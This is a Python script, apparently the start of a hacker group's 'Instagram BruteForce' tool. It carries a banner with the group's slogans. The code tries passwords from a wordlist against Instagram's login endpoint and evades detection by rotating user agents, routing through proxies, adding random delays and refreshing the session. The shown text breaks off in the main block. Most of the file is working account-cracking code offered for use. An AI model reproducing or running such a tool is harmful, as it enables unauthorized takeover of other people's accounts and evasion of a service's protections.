import os.path
import requests
import random
import time
import sys
import pyfiglet
from bs4 import BeautifulSoup

ulus = pyfiglet.figlet_format("RAVEES")
print(ulus)
print('#REMEMBER RAVEES #REMEMBER MOHAMMAD KAIF #IMANNINFOSEC #TEAM SYNC  ')
print('EAGLES OF INDAINA')
print('DONT TRY TO CHASE US WE ARE UNBEATABLE WE ARE UNDEFEATABLE')
if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    insta.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.instagram.com/accounts/login/ajax/'
PROXIES = {
    'http': 'http://your_proxy_here:port',
    'https': 'http://your_proxy_here:port',
}
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
]
DELAY = random.uniform(1, 3)  # Random delay between requests
PAYLOAD = {}
COOKIES = {}


def get_random_user_agent():
    return random.choice(USER_AGENTS)


def create_form():
    form = dict()
    cookies = {}
    headers = {
        'User-Agent': get_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }

    session = requests.Session()
    data = session.get('https://www.instagram.com/accounts/login/', headers=headers, proxies=PROXIES)
    for i in data.cookies:
        cookies[i.name] = i.value
    return form, cookies, session


def is_this_a_password(username, index, password, session):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES, session = create_form()
        PAYLOAD['username'] = username
    PAYLOAD['password'] = password

    headers = {
        'User-Agent': get_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }

    try:
        r = session.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=headers, proxies=PROXIES)
        if 'authenticated": true' in r.text:
            print('\n[+] Password found: ', password)
            return True
        elif 'checkpoint_required' in r.text:
            print('[-] CAPTCHA or checkpoint required. Try again later.')
            return False
        else:
            print(f'[!] Attempt {index}: Failed with password: {password}')
            return False
    except Exception as e:
        print(f'[!] Error: {e}')
        return False


if __name__ == "__main__":
    print('\n---------- Welcome To Instagram BruteForce By Ravees ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print